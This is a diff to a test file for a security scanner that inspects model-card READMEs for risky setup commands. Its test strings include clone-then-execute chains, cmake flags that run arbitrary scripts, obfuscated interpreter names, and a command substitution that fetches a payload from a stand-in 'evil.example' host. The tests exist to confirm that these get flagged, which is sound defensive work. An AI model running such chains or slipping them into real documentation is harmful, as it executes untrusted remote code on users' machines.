@@ -5125,6 +5125,9 @@ def _assert_requirements_actionable(tmp_path: Path, requirement_line: str) -> No
         "```bash\ngit clone --depth 1 https://github.com/owner/repo.git ./models/repo\n```\n",
         "```bash\npip install --extra-index-url=https://download.pytorch.org/whl/ torch\n```\n",
         "```bash\npython -m pip install --index-url=https://pypi.org/simple/ torch\n```\n",
+        "```bash\npython3 -m pip install --index-url=https://pypi.org/simple/ torch\n```\n",
+        "```bash\npython3.12 -m pip install --index-url=https://pypi.org/simple/ torch\n```\n",
+        "```bash\ngit clone https://github.com/owner/repo.git\ncmake -B build -DAPP_INCLUDE_TESTS=ON\n```\n",
         "```bash\nuv pip install --pre vllm==0.10.1+gptoss \\\n"
         "  --extra-index-url https://wheels.vllm.ai/gpt-oss/ \\\n"
         "  --extra-index-url https://download.pytorch.org/whl/nightly/cu128 \\\n"
@@ -5168,6 +5171,13 @@ def test_routine_documented_examples_are_informational(tmp_path: Path, content: 
         "git clone https://github.com/owner/repo.git ../repo",
         "git clone https://github.com/owner/repo.git\npython repo/payload.py",
         "git clone https://github.com/owner/repo.git\nbash repo/payload.sh",
+        "git clone https://github.com/owner/repo.git\ncmake -B build -P run.cmake",
+        "git clone https://github.com/owner/repo.git\ncmake -B build -Cinit.cmake",
+        "git clone https://github.com/owner/repo.git\ncmake -B build -E env python run.py",
+        "git clone https://github.com/owner/repo.git\ncmake -B build -DCMAKE_PROJECT_INCLUDE=run.cmake",
+        "git clone https://github.com/owner/repo.git\ncmake -B build -D CMAKE_PROJECT_INCLUDE=run.cmake",
+        "git clone https://github.com/owner/repo.git\ncmake -B build -DCMAKE_TOOLCHAIN_FILE=run.cmake",
+        "git clone https://github.com/owner/repo.git\ncmake -B build -DCMAKE_USER_MAKE_RULES_OVERRIDE=run.cmake",
         "git clone https://github.com/owner/repo.git $(curl https://evil.example/payload.sh)",
         "git clone https://github.com/owner/repo.git\ncat <<EOF\npayload\nEOF",
         "uv pip install --extra-index-url https://evil.example/simple demo",
@@ -5194,6 +5204,59 @@ def test_documented_setup_preserves_suspicious_commands(tmp_path: Path, command:
         for check in result.checks
     )
     assert determine_exit_code(scan_model_directory_or_file(str(path), cache_enabled=False)) == 1
+
+
+@pytest.mark.parametrize(
+    "execution",
+    [
+        "```bash\npython repo/install.py\n```\n",
+        "```bash\n./repo/install.sh\n```\n",
+        "```bash\n./repo/install.py --help\n```\n",
+        "```bash\nexec -a installer python repo/install.py\n```\n",
+        "```bash\npython3 -m repo.install\n```\n",
+        "```bash\nPython.exe repo/install.py\n```\n",
+        "```bash\npython3 \\\n repo/install.py\n```\n",
+        '```bash\n"python3" repo/install.py\n```\n',
+        '```bash\npyt""hon3 repo/install.py\n```\n',
+        "```bash\nenv MODE=setup python3 repo/install.py\n```\n",
+        "```bash\ncd repo && bash install.sh\n```\n",
+        "```bash\nuv run repo/install.py\n```\n",
+        "```bash\ncmake -B build -P repo/install.cmake\n```\n",
+        "```python\nimport subprocess\nsubprocess.run(['python', 'repo/install.py'])\n```\n",
+        "```python\nimport runpy\nrunpy.run_path('repo/install.py')\n```\n",
+        "```bash\npython repo/install.py\n",
+    ],
+)
+def test_documented_clone_script_chains_across_fences_remain_actionable(tmp_path: Path, execution: str) -> None:
+    content = "```bash\ngit clone https://github.com/owner/repo.git\n```\n\nRun the next step:\n\n" + execution
+    result = _scan_text_content(tmp_path / "README.md", content)
+    assert any(
+        check.details.get("type") == "network_command"
+        and check.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}
+        for check in result.checks
+    )
+    assert determine_exit_code(scan_model_directory_or_file(str(tmp_path / "README.md"), cache_enabled=False)) == 1
+
+
+@pytest.mark.parametrize(
+    "following",
+    [
+        "```bash\npip install -e .\n```\n",
+        "```bash\npython3 -m pip install --index-url=https://pypi.org/simple/ torch\n```\n",
+        "```bash\npython3 --version\n```\n",
+        "```bash\npython3 -h\n```\n",
+        "```bash\ncommand -v python3\n```\n",
+        '```bash\necho "python repo/install.py"\n```\n',
+        '```bash\necho "&&" python repo/install.py\n```\n',
+        '```python\nclient = OpenAI(base_url="http://localhost:8000/v1")\n```\n',
+    ],
+)
+def test_documented_clone_with_separate_routine_examples_is_informational(tmp_path: Path, following: str) -> None:
+    content = "```bash\ngit clone https://github.com/owner/repo.git\n```\n\n" + following
+    result = _scan_text_content(tmp_path / "README.md", content)
+    checks = _failed_network_detection_checks(result)
+    assert checks and all(check.severity == IssueSeverity.INFO for check in checks)
+    assert determine_exit_code(scan_model_directory_or_file(str(tmp_path / "README.md"), cache_enabled=False)) == 0
 
 
 @pytest.mark.parametrize(
@@ -5247,6 +5310,17 @@ def test_routine_example_policy_is_limited_to_markdown_model_cards(tmp_path: Pat
         check.severity == IssueSeverity.WARNING and check.details.get("type") == "url_detected"
         for check in result.checks
     )
+
+
+@pytest.mark.parametrize("filename", ["README", "model_card"])
+def test_routine_examples_in_extensionless_markdown_model_cards_are_informational(
+    tmp_path: Path, filename: str
+) -> None:
+    path = tmp_path / filename
+    result = _scan_text_content(path, "```bash\ngit clone https://github.com/owner/repo.git\n```\n")
+    checks = _failed_network_detection_checks(result)
+    assert checks and all(check.severity == IssueSeverity.INFO for check in checks)
+    assert determine_exit_code(scan_model_directory_or_file(str(path), cache_enabled=False)) == 0
 
 
 @pytest.mark.parametrize(
